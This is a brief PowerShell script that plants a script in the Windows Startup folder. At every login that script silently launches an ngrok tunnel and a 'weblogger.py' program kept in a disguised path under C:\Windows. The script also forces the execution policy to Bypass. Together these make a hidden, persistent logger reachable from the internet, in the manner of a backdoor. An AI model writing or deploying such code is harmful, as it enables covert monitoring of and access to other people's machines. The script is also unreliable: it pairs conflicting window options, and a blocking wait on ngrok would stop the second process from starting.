# Define the port number for Flask web server
$flaskPort = 5000

# Define the path to weblogger.py file
$webloggerPath = "C:\Windows\winX32\src\weblogger.py"

# Define the command to execute ngrok
$ngrokCommand = "ngrok http $flaskPort"

# Define the command to execute weblogger.py
$webloggerCommand = "python '$webloggerPath'"

# Create a PowerShell script to execute ngrok and weblogger.py silently
$script = @"
Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $ngrokCommand' -WindowStyle Hidden -NoNewWindow -Wait
Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $webloggerCommand' -WindowStyle Hidden -NoNewWindow -Wait
"@

# Define the path to the startup folder
$startupFolderPath = [Environment]::GetFolderPath("Startup")

# Define the path to the startup script
$startupScriptPath = Join-Path -Path $startupFolderPath -ChildPath "execute_ngrok_weblogger.ps1"

# Write the script to the startup script file
Set-Content -Path $startupScriptPath -Value $script

# Make sure the script can be executed
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
